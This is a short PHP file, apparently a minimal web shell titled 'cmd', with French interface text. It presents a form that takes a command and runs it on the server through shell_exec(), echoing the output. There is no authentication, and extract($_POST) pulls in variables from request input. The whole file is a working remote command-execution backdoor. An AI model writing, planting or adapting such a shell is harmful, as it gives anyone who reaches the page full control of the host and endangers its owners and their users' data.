<?php
if(isset($_POST['sendcode'])){
	extract($_POST);
	if(!empty($code)){
		function resultat($code){
			echo "<pre>";
			print_r(shell_exec($code));
			echo "</pre>";
		}

	}else{
		echo "<h1>veuillez remplir le champ</h1>";
	}
}
?>
<!DOCTYPE html>
<html>
<head>
	<title>cmd</title>
</head>
<body>
<form method="post">
	<h1>Entrez une commande</h1>
	<input type="text" name="code"></br>
	<input type="submit" name="sendcode" value="cmd"></br>
	
</form>
<?php if(isset($_POST['sendcode'])){ resultat($code); }else{} ?>
</body>
</html>
